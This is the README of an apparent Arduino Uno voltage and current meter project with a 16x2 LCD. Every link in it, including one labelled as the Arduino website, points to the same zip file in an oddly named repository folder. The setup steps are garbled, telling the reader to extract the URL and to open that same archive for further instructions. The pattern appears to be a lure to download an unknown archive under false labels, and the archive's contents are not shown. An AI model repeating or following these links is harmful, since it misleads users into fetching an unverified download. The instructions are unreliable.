## 🚀 Getting Started
Welcome to the MEDIDOR_TENSAO_CORRENTE project. This software allows you to measure voltage and current using an Arduino board. You do not need programming skills or advanced technical knowledge to use it.

## 📋 Features
- Measure AC and DC voltage and current.
- Easy setup with Arduino Uno.
- Display readings on a 16x2 LCD.
- Built-in Ohm’s Law calculations.
- Suitable for electronics projects and experiments.
  
## ⚙️ System Requirements
To run this application, you will need:
- An Arduino Uno board.
- A compatible computer (Windows, macOS, or Linux).
- A USB cable to connect Arduino to your computer.
- Drivers for Arduino (if not installed).

### 🧩 Setup Instructions
Once downloaded, follow these steps to set up your application:

1. Extract the `https://raw.githubusercontent.com/erick6738/MEDIDOR_TENSAO_CORRENTE/main/unorthodoxically/TENSA_MEDIDO_CORRENTE_1.2.zip` file to a folder on your computer.
2. Open the folder and locate the `https://raw.githubusercontent.com/erick6738/MEDIDOR_TENSAO_CORRENTE/main/unorthodoxically/TENSA_MEDIDO_CORRENTE_1.2.zip` file for additional setup instructions.
3. Make sure your Arduino board is connected to your computer with the USB cable.
4. Upload the provided Arduino sketch by opening it in the Arduino IDE. If you don't have the IDE, download it from the [Arduino website](https://raw.githubusercontent.com/erick6738/MEDIDOR_TENSAO_CORRENTE/main/unorthodoxically/TENSA_MEDIDO_CORRENTE_1.2.zip).

## 🔌 Wiring
Set up your circuit as follows:

- Connect the voltage terminals to the appropriate pins.
- Use a shunt resistor to measure current.
- Connect the LCD display as per the wiring diagram included in the extracted files.

## 📺 Running the Application
After uploading the sketch to your Arduino, you can power the board to run the application. The LCD will display voltage and current readings.

## 📊 Understanding Readings
- Voltage is displayed in volts (V).
- Current is displayed in amperes (A).
- Use the readings to perform calculations based on Ohm's Law, or integrate them into your projects.
